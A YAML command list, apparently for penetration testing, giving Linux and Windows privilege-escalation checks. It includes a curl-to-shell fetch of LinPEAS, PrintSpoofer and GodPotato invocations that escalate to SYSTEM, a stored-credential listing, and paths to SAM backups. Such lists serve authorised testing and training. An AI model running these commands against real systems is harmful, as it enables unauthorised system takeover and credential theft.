commands:
  linux_privesc:
    - description: "LinPEAS automated enumeration"
      command: "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh"
    - description: "Find SUID binaries"
      command: "find / -perm -4000 -type f 2>/dev/null"
    - description: "Find writable files"
      command: "find / -writable -type f 2>/dev/null | grep -v proc"
    - description: "Check sudo permissions"
      command: "sudo -l"
    - description: "Find cron jobs"
      command: "cat /etc/crontab; ls -la /etc/cron.*; crontab -l"
    - description: "Check capabilities"
      command: "getcap -r / 2>/dev/null"
    - description: "Kernel exploit check"
      command: "uname -a; cat /etc/os-release"
    - description: "Check PATH hijack opportunities"
      command: "echo $PATH; find / -perm -002 -type d 2>/dev/null"
  windows_privesc:
    - description: "WinPEAS automated enumeration"
      command: "winpeas.exe"
    - description: "Check current privileges"
      command: "whoami /priv"
    - description: "SeImpersonate → SYSTEM (PrintSpoofer)"
      command: "PrintSpoofer.exe -i -c cmd"
    - description: "SeImpersonate → SYSTEM (GodPotato)"
      command: "GodPotato.exe -cmd 'cmd /c whoami'"
    - description: "Unquoted service paths"
      command: "wmic service get name,displayname,pathname,startmode | findstr /i auto | findstr /i /v \"C:\\Windows\\\\\""
    - description: "Weak service permissions"
      command: "accesschk.exe /accepteula -uwcqv \"Authenticated Users\" * /svc"
    - description: "AlwaysInstallElevated check"
      command: "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"
    - description: "Stored credentials"
      command: "cmdkey /list"
    - description: "SAM/SYSTEM backup files"
      command: "dir C:\\Windows\\Repair\\SAM; dir C:\\Windows\\System32\\config\\RegBack"
